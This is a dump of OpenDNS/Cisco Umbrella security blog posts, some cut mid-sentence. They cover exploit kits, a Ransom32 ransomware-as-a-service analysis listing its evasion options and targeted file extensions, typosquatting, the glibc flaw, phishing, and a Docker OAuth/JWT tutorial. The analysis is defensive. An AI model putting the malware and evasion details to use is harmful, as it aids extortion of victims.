One way is through exploit kits (EKs). Attackers write EKs to run on web applications to exploit specific vulnerabilities in software that can allow them to compromise your system. An EK can hide within a website’s code. To the visitor, it is invisible.\nWhether a vulnerability has been around for months or it is a zero-day exploit, the attacker is counting on you to put off updating that vulnerable web browser or plugin. They’re counting on you clicking “remind me later,” every time you’re prompted to install an update.\nAlthough it causes all sorts of security problems, “remind me later” really is a necessity. You don’t always want to update to the latest software version. Updating one software version sometimes breaks another piece of crucial software. So, you defer and continue pushing off the update until everything is compatible. Then there’s the inconvenience. Wait for an installation and then a reboot in the middle of a work day? Never. Gonna. Happen.\nThe attackers know these systems are out there, unpatched against the latest vulnerabilities. How do attackers find a computer to exploit? Spam and phishing are a common strategy. You know when you receive that email with all of the empty promises of a bad infomercial?\n“Click here for singles in your area that want to meet you!”\n“Click here to lose weight instantly. The new mouse clicking exercise routine awaits!”\nOnce you click a link from a phishing email, your browser is likely directed to a compromised website hosting an EK, ready to take advantage of your out-of-date browser or plugins. One of the most widely used EKs at the moment is Angler. Throughout 2015, Angler was seen to exploit mainly Flash, Internet Explorer, and Silverlight based Common Vulnerabilities and Exposures (CVEs) [1].\nPhishing sites aren’t the only sources for exploit kits. It could be a seemingly innocuous website that you visit regularly, like your banking site. One technique used on compromised websites is to modify the website’s HTML code to load a malicious Flash file from yet another compromised site. Flash then issues the HTTP POST request. The response to POST will redirect the visitor to another website.\nWhen the landing page for the EK is reached, it will decide which exploit it can deploy based on browser and plugin information gathered from the visitor. The goal here is a drive-by download. If the computer is able to be exploited, the payload (malware) is downloaded. The payload is executed and post-infection communication to command and control (C&C) servers begins.\nPayloads vary; the most prevalent being ransomware variants and infostealers. Ransomware, such as Teslacrypt [2], encrypts specific file types on your computer so that you are no longer able to access them and offers to decrypt them for you after receiving payment.\nTeslaCrypt callback traffic; compromised domains.\nA Trojan infostealer, such as Dridex [3], is able to collect screenshots while you use your computer, grab information entered into forms from specific sites you visit, and redirect to false banking sites.\nDridex XML configuration, showing which URLs to use to capture form submissions.\nOf course, the goal of exploitation isn’t always to steal your personal information. The aim could be to keep infecting more computers, leaving a backdoor for remote access communication and enlisting computers into a zombie botnet. Botnets are computers that can be issued commands from a C&C server and are used for spamming, or DDoS attacks.\nLet’s not forget the vigilantes. There are rumors of vigilante white/gray hats taking over the Dridex botnet to send out payloads of popular antivirus software. The AV cleans the machine of all known malware in its definitions and then releases control. The anti-malware-malware.\nTo keep up to date on the latest CVEs, sign up with US-CERT to receive alerts on exploits and zero-days. Another good resource is the Offensive Security Exploit Database. Give the database a search before you add that new plugin to your WordPress site. Speaking of WordPress, the Exploit Database currently has 857 archived exploits regarding the publishing application. If you’re running WordPress, it’s imperative that you keep it up to date. The majority of the EKs that researchers find are hosted on compromised WordPress sites [4].\nBe sure to always update your OS, web browsers, and plugins with the latest patches. You can use Umbrella, OpenDNS’s flagship enterprise security product and have access to a dashboard that provides centralized visibility and control over all of your organization’s offices and users, no matter where they operate. And with Investigate, you’re able to pivot through an attacker’s infrastructure to detect or respond to threats.\n\n[domain that OpenDNS has blocked for being associated with TeslaCrypt]\n\nOf course, you could always keep hoping for some of that anti-malware-malware to drop on your systems.', 'Security Community;Security Research', 'https://umbrella.cisco.com/blog/2016/03/02/exploit-kits-for-all/');

Bernstein (aka djb). At that time, and to this day — in our opinion — djbdns has long been one of the most secure and reliable DNS suites out there. In 2004 it was the second-most popular DNS server, and is still in use by many companies, including Facebook and OpenDNS, for authoritative DNS service. The code base is approachable and runs on most anything with a C compiler (a joke from our team: if you want to run a DNS server on your toaster or coffee pot, djbdns is the way to go).\nThat said, nine years is a long time, and in that time we have made thousands of modifications to dnscache, averaging a commit a day to master. These commits introduced many features not found in dnscache, such as block and allow lists, CacheCheck, category filtering, IPv6 support, and even modifications to how dnscache handles TCP connections. This doesn’t count the number of RFC’s and drafts, like the Global Internet Speedup effort, for which we have added support. We have worked hard, adapting to changing DNS and Internet landscapes.\nThese days it’s hard to look at opendnscache and see djb’s dnscache. Much like Dorothy in Oz, someone expecting to see dnscache when looking at our code base will have the “We’re not in Kansas anymore” feeling. The ideas are still there, and we take to heart the way that djb wrote his software — security is the most important aspect of what we do. There are still places where djb shines through, but opendnscache is uniquely ours.\nWe are proud to be based on dnscache. As stated in our comment on the CloudFlare blog, the specific functionality that can lead to exploiting the glibc vulnerability had already been modified.

Thomas Mathew and I were delighted to talk about “Defeating malware with signal analysis techniques” on the 9th. SAS is one of my favorite security conferences of the year because it combines great quality talks, a very tech-savvy yet jolly crowd, and highly entertaining activities. We had the chance to catch up with friends from the community and meet with our friends from the Talos research team. As a matter of fact, we are pleased to invite Nick Biasini from Talos to contribute to this blog.\nSAS first day was at the Magma Art & Congress Center, Tenerife [Nick Biasini].\nSunset view from the hotel [Alisha Anderson].\nAfter the 2 days conference, we had a full day of entertainment organized by Kaspersky for all attendees. We took a trip to Teide National Park, a must-see wonder in Tenerife. At 3,700 m, this is the highest peak on Spanish soil and it is regarded as the world’s third-tallest volcanic structure. The views were breathtaking and otherworldly. We also visited the Teide Observatory which is an astronomical observatory on Mount Teide operated by the Instituto de Astrofísica de Canarias. Several technicians at the observatory gave us a tour of several world-class telescopes financed by various European countries for advanced astronomical projects. Teide Observatory is known for its great astronomical seeing conditions.\nLas Cañadas volcanic cauldron in Tenerife [Nick Biasini].\nSunset view on the way down from El Teide [Alisha Anderson].\nInsights from Dhia Mahjoub\nThere were numerous quality talks at SAS, and it’s hard to go over all of them here. A nice appearance was that of Reuben Paul as a keynote speaker. He demonstrated live attacks and delivered inspiring words, from his 9-year-old perspective, on teaching kids to be curious and enthusiastic about security. I was pleased to meet Reuben’s family afterwards.\nWith friends Reuben and Mano Paul [Mano Paul].\nIn “Poseidon’s APT boutique” Kaspersky researchers unveiled the first Portuguese-speaking targeted attack group, named “Poseidon.” The group is more likely a commercial threat player and appears to have been active since at least 2005. Poseidon’s campaigns were particularly tailored towards the MS Windows family, and heavily focused on espionage for commercial interests with at least 35 enumerated victims including companies in energy and utilities, telecommunications, public relations, media, financial institutions, governmental institutions, services in general and manufacturing. These victims are mostly in Brazil, USA, France, Kazakhstan, United Arab Emirates, India, and Russia. Poseidon used spear phishing as the main infection vector packaged with embedded, executable elements inside office documents with the executables often digitally signed to avoid detection or blocking. After the infection, the malware reports to CnC servers, then starts a lateral movement phase. This phase will often leverage a specialized tool that automatically collects a variety of information including credentials, group management policies, or system logs to better adapt further attacks. The information exfiltrated is then leveraged by a company front to blackmail victim companies into contracting the Poseidon Group as a security firm under the threat of exchanging the stolen information with competitors. This extortion component of this campaign is what differentiates the Poseidon group from others. It is also noteworthy that the group did not leverage zero-day vulnerabilities in the samples analyzed. Poseidon focused primarily on conventional means to deceive users with executables posing inside office documents, and actual poisoned documents with malicious macro-scripts has been the sole method used for compromising their desired targets. Finally, it seems this group managed to stay under the radar because many of its campaigns were designed to run on specific machines with diverse CnC servers located in different countries that are swiftly discarded.\nInsights from Thomas Mathew\nThomas Rid, professor at Imperial College London and author of Rise of the War Machines, gave an excellent talk about the Moonlight Maze APT group. The talk was part detective story and part historical overview. Many security practitioners are familiar with APT groups that have been named in the last five years by companies like Kaspersky and Mandiant. Information about older APT groups has been more rare. What made the talk interesting were the details about an APT group that had been around in the 1990s. Through a painstaking investigation involving multiple Freedom of Information Act requests to obtain first hand government documents and interviews with personnel involved with the case. Rid was able to piece together how a suspected Russian APT group was able to enter classified US networks and exfiltrate data. The group ‘Moonlight Maze’ used universities with close connections to government run programs as entry points to into the government networks. This gave them the ability to not only obtain sensitive material but also run jobs on US supercomputers. Ultimately the discovery of the Moonlight Maze group led to a classified congressional hearing. Rid had to conduct many personal interviews to obtain information about the group because many of the original documents detailing the group’s MO were destroyed. Moonlight Maze also has a connection to the present. Parts of the Maze infrastructure were also used by the Turla group as they hacked satellites.\nIn another talk, Sergey Golovanov and Vladislav Roskov of Kaspersky gave an update on the Carbanak group that Kaspersky discovered last year. This year the group exposed Metel/Corkow, another Trojan that infected a Russian bank and surreptitiously transferred money to criminals. By identifying flaws in the groups code, Kaspersky was able to identify servers involved in the money transfers. They accomplished this by scanning the entire IP space for servers that output a particular error string when asked a question. It was a cool demonstration of using network tools like scanning to help find malicious servers.\nInsights from Nick Biasini\nA couple weeks ago I was given the opportunity to present at Kaspersky’s Security Analyst Summit.  The topic was Bedep, a favorite payload of Angler, and associated threats.  This was a continuation to the previous work on Angler by Talos. It was my first SAS experience and I thoroughly enjoyed spending time in Tenerife. The venue was excellent, including the accommodations and the conference tracks.  In particular, I enjoyed the duration of the talks. The 20-30 minute window provided time for technical details, without a lot of excess information. This allowed for more talks, covering a diverse range of topics.\nOverall, I found SAS to be a good mixture of technical and high-level presentations with an emphasis on APT.  The conference opened with an interesting presentation from Reuben Paul, giving a glimpse into the future of information security. I really enjoyed the opportunity to meet up with colleagues and discuss threats, including Angler and Bedep. One takeaway from the presentations is how much crimeware is evolving. It’s clear that adversaries are becoming more sophisticated and have really progressed over the last handful of years. There were plenty of examples of crimeware carrying out operations and executing them effectively with substantial financial returns.\nSee you at RSA 2016\nNext Thursday, March 3 at 10:20am, OpenDNS Research Labs will be presenting at RSA on “Using Large Scale Data to Provide Attacker Attribution for Unknown IoCs”.

It was the latest in a long string of domain shenanigans perpetrated on both sides of the political spectrum. While nothing illegal was done to gain control of the politician’s URL name, it’s an important lesson for companies, organizations, and personalities — virtually any entity with a site and a reputation to protect.\nCybersquatting — or typo-, domain-, URL-, or whatever other type of squatting you wish to call it — usually takes one of a handful of variations. It could be a misspelling like twtter[.]com. It could be a correct spelling but a different TLD (twitter[.]org instead of twitter[.]com). Or it could be a misuse of a country domain, like .cm (where the user might leave out the “o” in .com). The traffic sent to these misnomer domains would then direct to a phishing site asking for a login, or an activist site, or an opposing candidate’s site.\nWhat happened with jebbush[.]com is an opportunistic Trump supporter, or possibly someone associated with the campaign, registered the domain and set it to redirect to Trump’s campaign site. In this case it’s more properly categorized as domain squatting, since it’s not a URL typo.\ntedcruzforamerica.com points to a republished version of cic.gc.ca, promoting emigration to Canada.\nBecause Jeb Bush’s campaign had not registered it, the domain was up for grabs. As was tedcruzforamerica[.]com. Someone even went through the trouble of creating an entire site promoting emigration to Canada, a not-so-subtle political statement.\nThe difficult part about typosquatting is it preys on human nature. People make mistakes, typing in goggle[.]com instead of google[.]com, and that creates opportunity for criminals or activists.\nWhile these campaign jabs are trivial and even somewhat lighthearted consequences, not planning ahead when creating an online presence can have harmful results for a company’s reputation and its customers.\nHow to Protect Your Site\nTyposquatting has been around for a long time. Protection against typosquatting has since become more automated. OpenDNS, for instance, protects users against domain misspellings. Other services, like CloudFlare’s Registrar, can help provide protection for events like domain expiration.\nRegistering a domain is temporary. A domain is usually purchased for a number of years like a lease. Upon expiration, it becomes publicly available for registration again. But the process is not like flipping a switch. There is a whole process around a domain expiration, and it typically takes something like 40 to 75 days to be fully available to the public, depending on domain owner’s processes and policies.\nExpiring domains often go unnoticed. When they do, automated services and bidders are waiting to snatch them, especially if they have value. These are called Drop Services or Drop Catchers. They “help you secure a domain name by registering it the absolute split second it becomes available.” Needless to say, watching for expiration of your domain should be a top priority. Most all registry services provide easy notifications.\nDomain locks at the registry and registrar levels are an important measure that can protect against unwarranted changes. They would have prevented Tesla’s site hijack that occurred last year.\nHow to Protect Your Domain Brand\nInc has a few more suggestions for protection, including buying out misspellings and other TLD variations of your company name. Domains should also be viewed as a business opportunity. A domain is as much a part of a company’s identity as the company name itself. But the brand and identity don’t stop with the name.\nWhat names, products, topics, or words can be associated with or are related to your business? Think outside of the business name itself to gather more traffic, and to also protect its brand and reputation. Think about the negatives as well as the positives. One of the best ways to prevent an attack on a company’s reputation is to get there first.\nYourcompanysucks[.]com won’t pop up and damage your brand if you own it first.', 'Blog;News;People & Culture;Security 101;WHOIS', 'https://umbrella.cisco.com/blog/2016/02/25/typosquatting-on-the-2016-presidential-campaign-trail/');

We also saw this as a good opportunity to make some improvements to our current authentication setup for the registry, which uses Basic Authentication over HTTPS. After some experimentations, we’ve decided to try out the token based OAuth system, which will not only provide a much more sophisticated access control for our user images, but also allow us to use the same authentication across multiple registries. In this blog post, I will give an overview of OAuth workflow for Docker registries, and explain some of the implementation details which we’ve found to be poorly documented at the moment. Hopefully by the end of this, you will be able to roll out your own OAuth Server with Docker registry!\nJust Show Me The Code\nA sample implementation of our OAuth server can be found here. It’s a simple Flask app that understands the OAuth workflow and responds with a token that the v2 registry can understand. Instructions on how the setup the project can be found here, along with some explanations on its configurations.\nOAuth Workflow\nThe OAuth authentication workflow for Docker registry can be described with the following steps:\nClient begins with a connection to the image registry\nIf the image registry is properly setup with OAuth enabled, it will return a 401 error, and its response will contain information on how to authenticate\nThe client then contacts the authorization server as instructed with the previous response from the registry\nThe authorization server then returns a token representing the client’s access\nThe client makes another request to the image registry, this time with the token embedded in its header\nThe image registry tries to validate the token, and if successful, returns the resources requested by the client.\nLet’s walk through a concrete example. First, start the demo project in our repo. Then let’s make a request to our local registry:\ncurl https://192.168.99.100:5000/v2/_catalog\r\n*   Trying 192.168.99.100...\r\n* Connected to 192.168.99.100 (192.168.99.100) port 5000 (#0)\r\n* TLS 1.2 connection using TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA\r\n* Server certificate: localhost\r\n> GET /v2/_catalog HTTP/1.1\r\n> Host: 192.168.99.100:5000\r\n> User-Agent: curl/7.43.0\r\n> Accept: */*\r\n>\r\n< HTTP/1.1 401 Unauthorized\r\n< Content-Type: application/json; charset=utf-8\r\n< Docker-Distribution-Api-Version: registry/2.0\r\n< Www-Authenticate: Bearer realm=\"http://192.168.99.100:8080/tokens\",service=\"demo_registry\",scope=\"registry:catalog:*\"\r\n< X-Content-Type-Options: nosniff\r\n< Date: Sun, 31 Jan 2016 22:29:49 GMT\r\n< Content-Length: 134\r\n<\r\n{\"errors\":[{\"code\":\"UNAUTHORIZED\",\"message\":\"authentication required\",\"detail\":[{\"Type\":\"registry\",\"Name\":\"catalog\",\"Action\":\"*\"}]}]}\nAs expected, the registry responded with a 401 error. More importantly however, the Www-Authenticate header in the response specifies how the client should authenticate. Let’s break it down:\nRealm: realm tells the client where the OAuth server is located. In our case it points to http://192.168.99.100:8080/tokens\nService: service tells the OAuth server where the resources are hosted. In our case it’s our demo_registry\nScope: scope tells the OAuth server what kind of permissions are needed. In our case we are asking for admin access on the catalog endpoint.\nNow we should have all the information we need to contact our OAuth server. To be consistent with the way the docker client authenticates, let’s also pass our user credentials in the header in the HTTP Basic Auth format. First, base64 encode our credentials:\n$ echo -n username:password | base64\r\ndXNlcm5hbWU6cGFzc3dvcmQ=\nThen we can embed the result in our headers as follows:\ncurl -H \"Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=\" http://192.168.99.100:8080/tokens?service=demo_registry&scope=registry:catalog:*\n*   Trying 192.168.99.100...\r\n* Connected to 192.168.99.100 (192.168.99.100) port 8080 (#0)\r\n> GET /tokens?service=demo_registry&scope=registry:catalog:* HTTP/1.1\r\n> Host: 192.168.99.100:8080\r\n> User-Agent: curl/7.43.0\r\n> Accept: */*\r\n> Authorization: Basic dXNlcm5hbWU6cGFzc3dvcmQ=\r\n>\r\n< HTTP/1.1 200 OK\r\n< Server: gunicorn/19.4.5\r\n< Date: Sun, 31 Jan 2016 22:58:54 GMT\r\n< Connection: close\r\n< Content-Type: application/json\r\n< Content-Length: 719\r\n<\r\n{\r\n \"token\": \"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IllJMkI6N01JUTpIT0I0OjdXN0I6Uk5NTDpaRUZVOkdLMkc6VkM3RTo3UUhHOkdVR1Y6T1FYVTozN0lUIn0.eyJzdWIiOiIiLCJpc3MiOiJkZW1vX29hdXRoX3NlcnZlciIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dLCJleHAiOjE0NTQyODQ3MzQsImlhdCI6MTQ1NDI4MTEzNCwibmJmIjoxNDU0MjgxMTM0LCJhdWQiOiJkZW1vX3JlZ2lzdHJ5In0.QYGsEkuFv5Mpg2_2oov3KylQcYZEhXJXGKB_ahDCmya4MUnyprRISFfk3Eovvc5OgGWUQx5-Gl7eSBidVI0z7K29wUV7ITL5prnbwg5pIjxJAYLkzBCmouiAyE24Uxy2vkVtDTicWsWT7H54Ou_v2umv7bQe6JB3t6vYsmb3taiDUI_RTWxfSOp7OK1n6UVFEEUHiV57wP3aWZ60A379a9ZP6sEHKhEi306OvXPyaz804KFH7sTqbSMYf9DP_Gy8Jh04Tw9zKmClk-byct8Hspelw1JytbsQonlKwV9OH30DTCjgaWyNiavTTdfpRmiDRRMRsROjw2JLL8ZMMTZEhQ\"\r\n}\nAs expected, the oauth server responded with our token.

The JWT token consists of three parts separated by periods (.): Header, Claim, and Signature. A typical JWT token will look like this:\neyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6IllJMkI6N01JUTpIT0I0OjdXN0I6Uk5NTDpaRUZVOkdLMkc6VkM3RTo3UUhHOkdVR1Y6T1FYVTozN0lUIn0.eyJzdWIiOiIiLCJpc3MiOiJkZW1vX29hdXRoX3NlcnZlciIsImFjY2VzcyI6W3sidHlwZSI6InJlZ2lzdHJ5IiwibmFtZSI6ImNhdGFsb2ciLCJhY3Rpb25zIjpbIioiXX1dLCJleHAiOjE0NTQyODQ3MzQsImlhdCI6MTQ1NDI4MTEzNCwibmJmIjoxNDU0MjgxMTM0LCJhdWQiOiJkZW1vX3JlZ2lzdHJ5In0.QYGsEkuFv5Mpg2_2oov3KylQcYZEhXJXGKB_ahDCmya4MUnyprRISFfk3Eovvc5OgGWUQx5-Gl7eSBidVI0z7K29wUV7ITL5prnbwg5pIjxJAYLkzBCmouiAyE24Uxy2vkVtDTicWsWT7H54Ou_v2umv7bQe6JB3t6vYsmb3taiDUI_RTWxfSOp7OK1n6UVFEEUHiV57wP3aWZ60A379a9ZP6sEHKhEi306OvXPyaz804KFH7sTqbSMYf9DP_Gy8Jh04Tw9zKmClk-byct8Hspelw1JytbsQonlKwV9OH30DTCjgaWyNiavTTdfpRmiDRRMRsROjw2JLL8ZMMTZEhQ\nLet’s find out how each part of the JWT token is generated.\nHeader\nA JWT Header typically look like this before encoding (formatted with white space for readability):\n{\r\n            \"typ\": \"JWT\",\r\n            \"alg\": \"RS256\",\r\n            \"kid\": \"ABCD:EFGH:IJKL:MNOP:QRST:UVWX:YZ23:4567:ABCD:EFGH:IJKL:MNOP\"\r\n }\nThe “typ” field specifies the type of the token, and is usually set to “JWT.” The “alg” field specifies the algorithm used to generate the signature part of the token. For simplicity, our OAuth server only supports the RS256 Algorithm. A list of commonly used values for this field is listed below:\n\nLast but not the least, the “kid” field is an unique ID generated from the public part of the signing key. It was the source of a fair bit of frustration for us because there are no documentations on how this field should be generated! It wasn’t until we dug through the Github repository for Docker registry source code that we finally solved it. So, long story short, for Docker registry, the “kid” field should be implemented as follows:\nTake the SHA256 hash of the DER encoded public key, and truncate it to 240 bits. The result of that is then encoded into 12 base32 groups. The final result look like this:\nABCD:EFGH:IJKL:MNOP:QRST:UVWX:YZ23:4567:ABCD:EFGH:IJKL:MNOP\nYou can find our implementation of the algorithm here.\nNow that we have all the fields we need, we can create the actual header: strip all white spaces from the header, the result of which is base64 urlsafe encoded to form the first part of the token.\nClaim\nAlso known as the JWT payload, the claim set for the JWT token typically look like this:\n{\n “sub”: “”,\n “iss”: “demo_oauth_server”,\n “access”: [\n   {\n     “type”: “registry”,\n     “name”: “catalog”,\n     “actions”: [\n       “*”\n     ]\n   }\n ],\n “exp”: 1454284734,\n “iat”: 1454281134,\n “nbf”: 1454281134,\n “aud”: “demo_registry”\n}\nThe “iss” field specifies where the token is issued from, usually the FQDN of the OAuth Server is used. The “aud” field specifies the intended audience of the token, usually this is set to the FQDN of the docker registry. The ‘exp’ field specifies the expiration time of the token in unix time. The ‘nbf’ (not before) field specifies the earliest time when the token is valid. The “iat” field specifies when the token is issued.\nThe “access” field specifies what kind of permission this token has. In our example, the token granted us “push and pull” permissions on the repository named samalba/my-app. The Oauth server should generate this field based on the access request generated during the first connection to docker registry.\nAgain, white spaces are stripped from the claim and the result is then base64 urlsafe encoded to form the second part of the token.\nSignature\nThe signature is generated by taking the base64 urlsafe encoded header concatenated with the base64 urlsafe encoded claim using a period and signing it with the key and algorithm specified in the header. Using the header and claim given above, the pseudo code to generate the signature would be the following:\nRS256(base64_urlsafe_encode(header) + “.” + base64_urlsafe_encode(claim),  key)\nThe result is then concatenated to the token as the final part.\nA live debugger can be found at https://jwt.io/, and it can be a very useful way to make sure your tokens are valid.\nConclusion\nRolling out our own OAuth server wasn’t easy, and we hope that this blog has provided you with a good starting point so you don’t have to repeat some of the problems we faced.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1190, 'The Return of Ransom32', 'Artsiom Holub', 'February 18, 2016', 'The Ransom32’s Origin\nIf you keep an eye on ransomware threats or the RaaS (ransomware as a service) market, you most likely have already heard about Ransom32, the first JavaScript ransomware. Emisoft provides a good description of the first version of it here and Malwarebytes gives some implementation details of the malicious package here. At first glance this particular threat doesn’t look scary at all. You have to find a way to deliver a malware file larger than 22 MB malware, whereas most ransomware variants rarely exceed 1 MB in size.\nI needed a piece of malware to analyze for a malware analysis class I started recently, I decided to use Ransom32. After some time spent to locate the .onion site in the Tor network, and to register a Bitcoin wallet, I finally got to the client download section. At this point, I noticed that the client menu had new options:\n\nBundle Tor client – The author offers to include the tor client in the package, which looks less suspicious for AV. This increases package size by 1.3 MB. The first version had a built-in Tor client by default.\nBundle pluggable transport – This spoofs the connection so it seems to be connecting to a public Clearnet. The option increases the client size by 1.2 MB.\nRelay server – This offers a package that will have server and client side, which makes it a lot easier to deliver and monetize. The client has the smallest size of all options. The victim will download ransomware from the server that you need to set up. The downside is obvious: you have to set up a server somewhere else with a 24/7 runtime.\nWhat’s Inside\nI have two versions of the client. The first one has “Bundle pluggable transport”  enabled. The second one is a default version. The difference in package size is significant. The very first client was about 22 MB. The current are 1.06 MB and 3.31 MB. This indicates that the ransomware author listens to his customers. Decreasing the size and redesigning the package makes it a lot easier to use for malicious purposes.\nThe main part of the unpacked content consists of the following files:\n\nThe client with the enabled “Bundle pluggable transport” feature has two extra DLLs, that are responsible for its functionality.\nThis feature is an implementation of meek, which is an obfuscation layer for Tor designed to evade Internet censorship. Traffic is relayed through a third-party server that is hard to block, a ​CDN for example. It uses a trick called ​domain fronting to communicate with a Tor relay while appearing to talk to another domain.\nThe rest of the files within the archive have the following purposes:\ndotNetFx40_Full_setup.exe – The Microsoft .NET Framework 4 web installer package downloads and installs the .NET Framework components required to run on the target machine architecture and OS. So apparently this ransomware requires .NET framework 4 for normal functionality. This also means that without an Internet connection, encryption could not be performed. However, it’s not a legit version of the framework, but a repacked one. It modifies regular functions and supports ransomware operations. The original name: Boxstub.exe[SHA1:06BECADB92A5FCCA2529C0B93687C2A0C6D0D610]. It has been seen in different malware packages .\nStartMenu.dll – contains data that are required by the NW.js framework to function properly.\nTozpac.exe – is a packaged NW.js application and contains the actual malware code, as well as the framework required to run the malware. It implements the entire process of encrypting files, as well as handles all of the network negotiations.\nTozpac.exe.config – contains the malware’s configuration information.\nEncryption Process\nBefore encrypting your data, Ransom32 will first launch dotNetFx40_Full_setup.exe. Afterward, it triggers Tozpac.exe, which will encrypt them using AES encryption. One thing that I noticed is Tozpac.exe imports mscoree.dll to do the encryption. And this means that most of the functionality that was built-in before, is now imported using Windows DLLs:For example, to initiate Remote Procedure Call it’s using rpcrt4.dll. For encryption, it’s using crypt32.dll.\nUsing some dynamic analysis tricks we were able to find the attack extensions:\naaf, .accdb, .aep, .aet, .ai, .aif, .as, .as3, .asf, .asp, .asx, .avi, .bbrksave,\n.bejeweled2deluxesavedgame, .blasterball3savedgame, .bmp, .c, .chesstitanssave-ms,\n.chuzzledeluxesavedgame, .civ4savedgame, .civ4worldbuildersave, .class,\n.comfycakessave-ms, .cpp, .cs, .csv, .dat, .db, .dbf, .ddpokersave,\n.dinerdashsavedgame, .dna.xml,.doc, .docm, .docx, .dot, .dotm, .dotx, .dplsave,\n.dsasave, .dsqsave, .dssave, .dwg, .dxf,\n.efx, .egwarsave, .emlx, .eps, .fatesavedgame, .fla, .flv, .freecellsave-ms, .game, .games, .\ngif, .h, .heartssave-ms, .iff, .indd, .inx, .jar, .java, .jpeg, .jpg, .lssave, .m3u, .m3u8, .m4u,\n.mahjongtitanssave-ms,.max, .mdb, .mid, .minesweepersave-ms,\n.mov, .mp3, .mp4, .mpa, .mpeg, .mpg, .msg, .3dm, .3g2, .3gp, .pdb, .pdf, .php, .plb,\n.pmd, .png, .pot, .potm, .potx, .ppam, .ppj, .pps, .ppsm, .ppsx, .ppt, .pptm, .pptx, .prel,\n.prproj, .ps, .psd, .pspautosave, .purblepairssave-ms, .purbleshopsave-ms, .ra, .raw,\n.rb, .rtf, .sacred2save, .sav, .savage, .save, .savedgame, .savedsearch, .saver, .savgao,\n.savings, .sdf, .ses, .sgsav, .solitairesave-ms, .spidersolitairesave-ms, .spv, .sql, .sv5,\n.svg, .swf, .thewitchersave, .tif, .txt, .vcf, .vob, .wagame, .wav, .wma, .wmv, .wpd, .wps,\n.wsave, .xla, .xlam, .xll, .xlm, .xls, .xlsb, .xlsm, .xlsx, .xlt, .xltm, .xltx, .xlw, .xml\nOnce it has finished encrypting your data, it will display the Ransom32 ransom lock screen/ransom note as shown below.\n\nObfuscation via Node.js\nIt has been two months since I first saw Ransom32. At that time, it looked like the malware author cared mostly about the ability to imitate legitimate applications for the purpose of avoiding detection. However, as we can see, even the RaaS market is competitive. And as such, it seems to have forced the Ransom32 author to redesign his product.  Before, there were a number of various elements, including legitimate applications: i.e., the Tor client (renamed to rundll32.exe) and the size of the file was huge. Now, most of the functionality is embedded into one file that is only ~1MB in size. The technology that was chosen for the core — Node.js — has let the malware stay undetected by most AV products months after its first appearance.\n\nWhat makes the Ransom32 RaaS so scary, is that using a platform like NW.js brings us closer to the malware that could be easily run on Macs and Linux operating systems as they do on Windows. Although there does not seem to be any indication that this is being done as of yet, doing so would be trivial. We will keep monitoring Ransom32 to see how RaaS affects the ransomware market.', 'Incident Response;Malware;Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2016/02/18/return-of-ransom32-new-redesigned-version/');

We’ve seen many conversations like the one between @SwiftOnSecurity and @davidu, our founder:\n@SwiftOnSecurity @MalwareTechBlog Not likely. Should be truncated or thrown out. We strive to avoid TCP for many reasons, this being one.\n— ☁ David Ulevitch ☁ (@davidu) February 16, 2016\n\nThe good news is that if you are using OpenDNS, you aren’t affected. If you want the technical details of why, please read on as we dive a little into how we process a DNS response.\n—\nTo start off with, OpenDNS and our DNS software, opendnscache, do not rely on glibc for name resolution. This system library provides the underlying functionality expected of many programs, including name resolution via the getaddrinfo function. Instead these calls are normally leveraged by the software talking to OpenDNS to get an answer. So it is up to us to make sure that maliciously crafted responses are blocked before they reach you.\nIn the case of this exploit we do this by carefully reading the packet off the wire. The first step of this is getting the correct size for the packet. For UDP packets we do this using a `recv()` call that will only accept up to the buffer size we allocate. For TCP connections, we read 2 bytes, `malloc()` a buffer according to that size, then copy that number of bytes onto the new buffer. No swaps between stack & heap are done; opendnscache itself is safe.\nThat makes sure we have the right buffer size from the get go, but what prevents us from passing this garbage packet on to the end user? opendnscache does a number of validity checks on every packet. It checks to see if a packet attempts to overflow its size in every operation we do. If any malformed data is detected, we simply drop the packet; it never goes into our cache.\nWe also don’t store raw packets. We parse the answers and store only those records. The trailing junk on the exploited packet make reading in the packets the most dangerous portion. So if the packet managed to be well-formed, opendnscache would cache only the valid answers, not the junk at the end of the packet.\nBased on the initial reading of the report from Google and our own tests, opendnscache rejects these responses as malformed.', 'Security;Security Engineering;Uncategorized', 'https://umbrella.cisco.com/blog/2016/02/17/2980/');

Now, I’m not drawing this conclusion due to their repeated instances of poor grammar choices possibly caused by sleep deprivation. I’m drawing more from the fact that “phishermen” seem to always keep up with whatever season it is. Holiday season? Expect to see some phishes with presents and snowflakes on them. Tax season? Expect to see a lot of IRS related phishes. Groundhog Day season? Yep, you guessed it. TONS of phishes with Bill Murray’s face on them.\nBill Murray\nOkay I made that last one up. (Bill Murray phishes might be too hilarious to really fool anybody.) But one thing for sure is that it’s tax season, so you can expect to see some relative phishes showing up in your  inbox.\nHere is one example of what an IRS related phish might look like:\n\nAt first glance the page looks legitimate. What you can’t tell from the screenshot is the links on the page actually lead to the respective information pages on IRS.gov, making the phish even more convincing. But if you take the time to look at the URL, you would notice that this page is not hosted by IRS.gov. Why would the IRS ask for your information using a non-secure, non-government affiliated webpage? Well, they wouldn’t; and this page definitely smells phishy.\nSo how does one ensure that one doesn’t get phished? Most people rely on their own personal network security measures, but “nothing is perfect,” as the old saying goes. Installing some form of anti-phishing security measures on your network is a great first step. However, while you gain some protection, it’s never 100 percent. The second half of the equation comes from you knowing what phishing looks like.\nFor what should you be looking? I thought you’d never ask!\nBe cautious of unknown e-mail senders\nThe rub here is that if someone really knows what they’re doing, they can perform what’s called “E-mail Spoofing” and make the sender of the e-mail look like anybody they want. Regardless, it’s still a great practice. Take special care when the e-mail has a call to action, like demanding you download an attachment or click a link to fill out your personal information.\nReview the URL and verify HTTPS\n\nAlways, always, always check the URL before entering any personal information. You want to be looking for any indication that the page you’re on actually belongs to the company it claims to be, and also that it’s secure. I personally will also check to see what comes directly before the TLD (i.e. .com, .net) to make sure that, for example, it’s actually something like “paypal.com” and not “paypal.notaphishipromise.com”.\nDo NOT click on links, download files, or open attachments in e-mails from unknown senders\nJust don’t do it. If you really feel like you need to, maybe use some other form of communication 